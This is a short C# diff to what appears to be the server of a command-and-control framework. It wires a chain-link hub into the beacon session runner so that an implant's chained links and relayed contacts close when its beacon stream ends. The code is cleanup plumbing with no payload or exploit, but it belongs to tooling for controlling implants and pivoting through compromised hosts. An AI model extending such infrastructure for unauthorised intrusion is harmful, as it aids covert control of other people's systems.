@@ -52,6 +52,7 @@ internal sealed class BeaconSessionRunner
     private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
     private readonly TaskRelayHub _relays;
     private readonly SocksProxyHub _socks;
+    private readonly ChainHub _chain;
     private readonly BeaconIngest _ingest;
     private readonly BeaconTasking _tasking;
 
@@ -64,6 +65,7 @@ internal sealed class BeaconSessionRunner
         Rod.Transport.Channels.DegradedChannelHub degraded,
         TaskRelayHub relays,
         SocksProxyHub socks,
+        ChainHub chain,
         BeaconIngest ingest,
         BeaconTasking tasking)
     {
@@ -75,6 +77,7 @@ internal sealed class BeaconSessionRunner
         _degraded = degraded;
         _relays = relays;
         _socks = socks;
+        _chain = chain;
         _ingest = ingest;
         _tasking = tasking;
     }
@@ -195,9 +198,11 @@ internal sealed class BeaconSessionRunner
         // The stream is gone, and a channel is session-scoped (architecture.md
         // Sec 10.3): any relay bridged onto this implant's channels dies with
         // it, so the operator-side tool's connection ends instead of staring
-        // at a listener nothing more will cross.
+        // at a listener nothing more will cross. A chain link dies the same
+        // way, and every contact it carried ends with it (Sec 5.2).
         _relays.CloseImplant(session.Implant, "the implant's beacon stream ended");
         _socks.CloseImplant(session.Implant, "the implant's beacon stream ended");
+        _chain.CloseImplant(session.Implant, "the implant's beacon stream ended");
 
         // Surface how the stream ended, exactly as the first-completed loop
         // saw it -- after the strand closed, never instead of it.
